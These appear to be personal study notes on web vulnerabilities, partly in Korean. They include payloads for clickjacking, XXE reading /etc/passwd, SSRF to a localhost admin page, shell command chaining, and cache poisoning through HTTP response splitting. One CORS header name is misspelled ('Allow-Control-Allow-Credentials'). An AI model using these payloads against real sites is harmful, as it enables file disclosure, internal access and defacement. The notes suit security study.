#Basic Clickjacking attack

<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>




#Dom-based XSS


DOM XSS LABS	document.write()
Open redirection LABS	window.location
Cookie manipulation LABS	document.cookie
JavaScript injection	eval()
Document-domain manipulation	document.domain
WebSocket-URL poisoning	WebSocket()
Link manipulation	someElement.src
Web-message manipulation	postMessage()
Ajax request-header manipulation	setRequestHeader()
Local file-path manipulation	FileReader.readAsText()
Client-side SQL injection	ExecuteSql()
HTML5-storage manipulation	sessionStorage.setItem()
Client-side XPath injection	document.evaluate()
Client-side JSON injection	JSON.parse()
DOM-data manipulation	someElement.setAttribute()
Denial of service	RegExp()



#CORS (Cross-Origin Resource Sharing)


조건

요청의 메소드는 GET, HEAD, POST 중 하나여야 한다.

Accept, Accept-Language, Content-Language, Content-Type, DPR, Downlink, Save-Data, 
Viewport-Width, Width를 제외한 헤더를 사용하면 안된다.

만약 Content-Type를 사용하는 경우에는 application/x-www-form-urlencoded, multipart/form-data,
text/plain만 허용된다.

Access-Control-Allow-Origin에는 *를 사용할 수 없으며, 명시적인 URL이어야한다.
응답 헤더에는 반드시 Allow-Control-Allow-Credentials: true가 존재해야한다.


#XXE (XML external entity injection)

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

##XXE + SSRF
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

XInclude attacks 
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

##XXE attacks 

POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>



#SSRF 

브라우저에서 공격이 시도되는 CSRF 와는 달리 SSRF는 요청을 서버단에 존재하는 응용프로그램으로 api 요청을 보내 정보를 탈취함
이때 응용프로그램은 루프백이나 백엔드단으로 조회가 가능하여야 하며 공격자는 이를 이용해 정보를 요청하는 것
똑같은 요청이라도 권한이있는 응용프로그램 vs 권한이 없는 사용자 이기 때문에 SSRF 공격이 필요함
ex) 
POST / product / stock HTTP / 1.0
Content-Type : application / x-www-form-urlencoded
Content-Length : 118

stockApi = http : //stock.weliketoshop.net : 8080 / product / stock / check % 3FproductId % 3D6 % 26storeId % 3D1 


위는 응용프로그램이 가지고 있는 basic한 요청이다

이를 변형하여 

POST / product / stock HTTP / 1.0
Content-Type : application / x-www-form-urlencoded
Content-Length : 118

stockApi = http : // localhost / admin

루프백을 통해 /admin URL 을 통해 정보를 가져올수 있음.




#Command Injection

웹 어플리케이션에서 OS Command를 실행할 수 있는 php, node js,  python 등 이 존재해야함

## ` (백 쿼터)를 이용하여 명령을 실행할
ex) echo `echo hi` -> hi 


## $() 를 활용한 명령어 치환
ex) echo $(echo hi)

## && 명령어 연속실행 -> 앞 명령어가 정상적으로 수행되어야 사용가능

echo hello && echo world -> hello world

## || 앞 명령어에서 에러가 발생하면 뒷 명령어 실행가능

ex) cat/ || echo hi -> cat:/: ls a directory hi

## ; 명령어 구분을 위해 사용하며 앞 명령어와 무관하게 명령어 실행가능
ex) echo hello; echo world -> hello world

## | 명령어의 결과가 뒷 명령어의 입력으로 들어감 (리눅스와 같음)


#Server-side template Injection

코드에서 open이나 조회하는 값을 가지고 있는 입력포인트에 {},$() 등 다양한 문자열 우회를 통해 원하고자 하는 정보를 얻을수 잇는것
CTF 기준 Flag 조회


#Insecure Deserialization 

역직렬화

컴파일된 것에 디컴파일 후 코드 삽입, 다시 컴파일 후 리버스 쉘방식으로 연결 
대표적인 예로는 XML 코드를 통해 전달 
취약한 핸들러가 이용되는 플러그인을 사용하는 경우 XML에서 발생 가능
 
 
 
#Directory traversal 
말그대로 디렉터리 명령 구문을 통해 접근 가능하여야
URL이나 이미지값을 불러오거나 경로를 통해 불러오는 경우 취약할 수 있음.



#Access Control
말그대로..

#authentication
쿠키탈취를 통해 사용자의 정보를 탈취하거나
간단한 파라미터 변조를 통해 정보를 탈취하거나
Brute Force를 통해 비밀번호는 뚫을수 있거나 등 다양한 방법이 존재


#Cache Poisoning
비슷한 예로는 DNS Spoofing이 있음



1. 캐시에서 페이지 제거 
GET http://testsite.com/index.html HTTP/1.1
Pragma: no-cache
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8

Pragma : no-cache or Cache-Control : no-cache 부분 제거 후 
HTTP응답분할을 사용하여 두개의 응답을 생성


GET http://testsite.com/redir.php?site=%0d%0aContent-
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-
Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
nt-Length:%2020%0d%0aContent-
Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8


여기서 Last-Modified에서 의도적으로 시간을 미래시간으로 생성
여기서 설정해야할 필수 헤더 
Last-Modified (If-Modified-Since 헤더에서 확인
ETag (If-None-Match 헤더로 확인)


GET http://testsite.com/index.html HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8

서버 캐시에서 교체하려는 페이지에 대한 요청 보내기






